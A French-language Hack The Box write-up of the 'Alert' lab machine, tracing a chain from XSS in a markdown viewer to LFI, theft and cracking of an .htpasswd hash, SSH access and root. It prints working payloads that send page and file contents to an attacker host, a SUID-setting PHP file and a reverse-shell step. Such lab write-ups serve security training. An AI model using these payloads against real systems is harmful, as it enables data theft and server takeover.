---
date: 2025-03-21T23:31:12-05:00
# description: ""
image: "/images/HTB-Alert/Alert.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Alert"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Alert](https://app.hackthebox.com/machines/Alert)
* Niveau: Facile
* OS: Linux
---

Notre exploitation débute par la découverte de deux vulnérabilités XSS, l'une d'entre elles révélant une faille d'inclusion de fichier local (LFI). Grâce à cette faille, nous extrayons le contenu du fichier `.htpasswd`, révélant le mot de passe haché d'un l'utilisateur. Après avoir craqué le hachage, nous obtenons des identifiants valides et un accès initial à la cible. L'énumération du système révèle un site web hébergé en interne. Nous découvrons ensuite que l'utilisateur a les droits d'écriture sur un répertoire critique, ce qui nous permet d'accéder au compte root.

Adresse IP cible - `10.10.11.44`

## Balayage

```
nmap -sC -sV -Pn -p- -oA nmap/Alert {TARGET_IP}
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-04 11:38 CST
Nmap scan report for 10.10.11.44
Host is up (0.054s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)

80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://alert.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)

12227/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.16 seconds
```

Nmap trouve deux ports ouverts:
- 22 avec SSH
- 80 avec http et une redirection vers `alert.htb`

```
sudo echo "{TARGET_IP} alert.htb" | sudo tee -a /etc/hosts
```

## Enumération

À `http://alert.htb/`, nous trouvons un visionneur de markdown. 

![Alert maekdown viewer](/images/HTB-Alert/alert_website.png)

Nous téléversons un fichier et le visualisons. Il y a aussi un bouton `Share Markdown`.

![Share Markdown button](/images/HTB-Alert/view_md.png)

Nous avons également d'autres pages: `Contactez-nous`, `A propos de nous`, et `Donation`.

Le bouton `View Markdown` envoie une requête POST à `/visualizer.php`.

![visualizer.php request](/images/HTB-Alert/visualizer.png)

L'option `Share Markdown` envoie une requête GET à `/visualizer.php?link_share=xxxx.xxxx.md`.

![Share Markdown request](/images/HTB-Alert/visualizer_share.png)

Le bouton de la page de contact envoie une requête POST à `contact.php` et utilise deux paramètres `email` et `message`.

![Contact page request](/images/HTB-Alert/alert_contact.png)

Enfin, la page Donate envoie une requête POST à `/index.php?page=donate`.

![Donate page request](/images/HTB-Alert/alert_donate.png)

Nous utilisons gobuster pour trouver d'éventuels répertoires cachés et obtenons quelques résultats

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://alert.htb/
```

![Directory brute forcing](/images/HTB-Alert/alert_gobuster.png)

Tous les répertoires trouvés sont inaccessibles.

* `http://alert.htb/uploads/`

![uploads directory](/images/HTB-Alert/uploads_dir.png)

* `http://alert.htb/messages/`

![messages directory](/images/HTB-Alert/msg_dir.png)

* `http://alert.htb/server-status/`

![server_status directory](/images/HTB-Alert/server_status.png)

En utilisant ffuf, nous découvrons un sous-domaine: `statistics`.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://alert.htb -H "Host: FUZZ.alert.htb" -ic -fc 301
```

![Subdomain enumeration](/images/HTB-Alert/alert_ffuf.png)

À `http://statistics.alert.htb/`, nous trouvons une page de connexion qui demande un `username` et un `password`.

![statistics subdomain login page](/images/HTB-Alert/statistics_subdomain.png)

`Basic Authentication` est utilisé pour l'authentification de l'utilisateur. Cette méthode d'authentification simple n'est pas sécurisée en soi vu que les informations d'identification sont seulement encodées en Base64, et non chiffrées.

![Basic authentication](/images/HTB-Alert/basic_auth.png)

Nous retournons au visionneur de markdown. Ajoutons un payload XSS à notre fichier markdown.

```
<script>alert(1)</script>
```

![XSS test](/images/HTB-Alert/xss_md.png)

Lorsque nous affichons le fichier markdown, notre payload XSS est exécuté!

![XSS payload triggered](/images/HTB-Alert/alert_xss_payload.png)

La même chose se produit lorsque nous partageons le fichier.

![XSS payload triggered 2](/images/HTB-Alert/alert_xss_payload1.png)

Nous pouvons également tester une vulnérabilité XSS sur la page de contact.

```
<img src=x error= \"fetch('http://IP:PORT/?kscorpio')\"
```

![XSS test on contact page](/images/HTB-Alert/test_XSS.png)

Notre payload fonctionne dans ce cas également.

![XSS on contact page success](/images/HTB-Alert/XSS_test_success.png)

## Accès initial

Nous avons confirmé deux cas de XSS. Mettons à jour le contenu de notre fichier markdown et essayons de récupérer des données sensibles.

```javascript
<script>
fetch("http://alert.htb/")
    .then(response => response.text())
    .then(data => {
    fetch("http://IP:PORT/?data=" + encodeURIComponent(data));
    })
    .catch(error => console.error("Error fetching messages:", error));
</script>
```

Même si rien ne s'affiche lorsque nous visualisons notre fichier, la vérification du code source de la page confirme qu'il est inclus dans la page.

![page source code](/images/HTB-Alert/script_included.png)

Nous utilisons le lien obtenu avec le bouton `Share Markdown` à `/contact`.

![xss payload in contact page](/images/HTB-Alert/XSS_contact.png)

Après avoir envoyé le message, nous recevons une réponse sur notre serveur web.

Nous décodons la réponse codée en URL dans Burp. Son contenu est le fichier html de la page d'accueil.

![home page source code](/images/HTB-Alert/HTML_alert.png)

Une fois de plus, nous modifions le contenu de notre fichier markdown. Cette fois, nous allons essayer d'accéder à `/messages`. Nous utilisons un lien tel que `http://alert.htb/visualizer.php?link_share=xxxxxx.xxxxxx.md` sur la page de contact.

Si l'utilisateur qui exécute notre payload a des privilèges plus élevés, nous pourrions être en mesure de voir le contenu de `/messages`.

```Javascript
<script>
fetch("http://alert.htb/messages.php")
    .then(response => response.text())
    .then(data => {
    fetch("http://IP:PORT/?data=" + encodeURIComponent(data));
    })
    .catch(error => console.error("Error fetching messages:", error));
</script>
```

Sur le serveur web, nous recevons une réponse.

### Inclusion de fichiers locaux (LFI)

En utilisant le décodeur Burp, nous remarquons que la réponse utilise un paramètre `file` à la page `messages.php`.

![file parameter at messages.php](/images/HTB-Alert/file_param.png)

Essayons d'en tirer parti pour exploiter une vulnérabilité LFI.

```javascript
<script>
fetch("http://alert.htb/messages.php?file=../../../../../etc/passwd")
    .then(response => response.text())
    .then(data => {
    fetch("http://IP:PORT/?data=" + encodeURIComponent(data));
    })
    .catch(error => console.error("Error fetching messages:", error));
</script>
```

Après avoir décodé la réponse, nous constatons que le LFI fonctionne! Nous trouvons deux utilisateurs `albert` et `david`.

![XSS to LFI](/images/HTB-Alert/XSS_LFI.png)

Nous nous souvenons que `Basic Authentication` est utilisé à `http://statistics.alert.htb/`. Maintenant que nous avons un LFI fonctionnel, nous pouvons essayer de lire le fichier `.htpasswd`.

> Le fichier `.htpasswd` d'Apache stocke les noms d'utilisateurs et les mots de passe cryptés pour l'authentification HTTP.

Pour trouver son emplacement, nous allons lire le fichier de configuration d'Apache. Les chemins les plus courants sont `/etc/apache2/apache2.conf` et `/etc/apache2/sites-available/000-default.conf`.

> `apache2.conf` est le fichier de configuration principal tandis que `000-default.conf` est le fichier définissant la configuration des hôtes virtuels.

```javascript
<script>
fetch("http://alert.htb/messages.php?file=../../../../../etc/apache2/apache2.conf")
    .then(response => response.text())
    .then(data => {
    fetch("http://IP:PORT/?data=" + encodeURIComponent(data));
    })
    .catch(error => console.error("Error fetching messages:", error));
</script>
```

Nous lisons le contenu de `apache2.conf` mais il ne mentionne pas `.htpasswd` de manière pertinente.

![Apache2.conf file](/images/HTB-Alert/apache2.png)

En revanche, `000-default.conf` révèle l'emplacement de `.htpasswd` qui est `/var/www/statistics.alert.htb/.htpasswd`.

```javascript
<script>
fetch("http://alert.htb/messages.php?file=../../../../../etc/apache2/sites-available/000-default.conf")
    .then(response => response.text())
    .then(data => {
    fetch("http://IP:PORT/?data=" + encodeURIComponent(data));
    })
    .catch(error => console.error("Error fetching messages:", error));
</script>
```

![000-default.conf file](/images/HTB-Alert/000-default.png)

Nous allons maintenant lire le fichier.

```javascript
<script>
fetch("http://alert.htb/messages.php?file=../../../../../var/www/statistics.alert.htb/.htpasswd")
    .then(response => response.text())
    .then(data => {
    fetch("http://10.10.15.91:8000/?data=" + encodeURIComponent(data));
    })
    .catch(error => console.error("Error fetching messages:", error));
</script>
```

### Shell en tant que albert

Après avoir décodé la réponse, nous récupérons le hachage du mot de passe de `albert`.

![albert password hash](/images/HTB-Alert/albert_pwd.png)

Il s'agit d'un hachage Apache, qui peut être craqué avec le mode hashcat `1600`.

```
hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
```

Nous récupérons le mot de passe `manchesterunited`.

![albert password](/images/HTB-Alert/albert_pass.png)

---

Les informations d'identification `albert:manchesterunited` fonctionnent à `http://statistics.alert.htb/` mais la page n'affiche que des données sur les donateurs.

![Alert Dashboard](/images/HTB-Alert/donors_info.png)

---

Nous nous connectons via SSH avec ces informations d'identification et trouvons le drapeau utilisateur.

![Foothold & user flag](/images/HTB-Alert/user_flag.png)

## Elévation de Privilèges

Avec la commande `id`, nous découvrons que `albert` fait partie d'un groupe appelé `management`. En recherchant les fichiers liés à ce groupe, nous trouvons des fichiers suggérant un outil ou une application pour la surveillance des sites web.

![Files related to management group](/images/HTB-Alert/management_files.png)

Dans `/opt/website-monitor/`, nous trouvons d'autres fichiers qui confirment notre théorie d'une application de surveillance.

![Website monitor files](/images/HTB-Alert/website_monitor_files.png)

Avec `ps aux` nous remarquons que l'utilisateur `root` exécute l'application web sur le port `8080`.

![Internal website on port 8080](/images/HTB-Alert/root_ps_8080.png)

### Exploitation locale

Parce que `albert` fait partie du groupe `management`, il a les permissions d'écriture sur `/opt/website-monitor/config/`. Nous pouvons en abuser pour obtenir un shell en tant que root en mettant le bit SUID sur `/bin/bash`.

```PHP
<?php exec("chmod +s /bin/bash"); ?>
```

```
curl 127.0.0.1:8080/config/revshell.php

bash -p
```

![SUID bit set to bash binary](/images/HTB-Alert/SUID_root.png)

### Reverse Shell via le navigateur

Nous pouvons également exécuter un fichier reverse shell PHP. Cependant, nous devons d'abord mettre en place un tunnel.

```
ssh -L {PORT}:localhost:8080 albert@IP
```

Nous accédons en effet à une application de surveillance à `http://localhost:{PORT}/`.

![Access to internal website](/images/HTB-Alert/website_monitor_website.png)

Nous naviguons vers `http://localhost:{PORT}/config/revshell.php` pour exécuter notre fichier malveillant.

> J'ai utilisé le shell `PHP Ivan Sineck` disponible sur [revshells.com](https://www.revshells.com/).

![php reverse shell](/images/HTB-Alert/php_revshell_file.png)

Nous recevons un shell root sur notre listner netcat.

![root flag](/images/HTB-Alert/revshell_root.png)



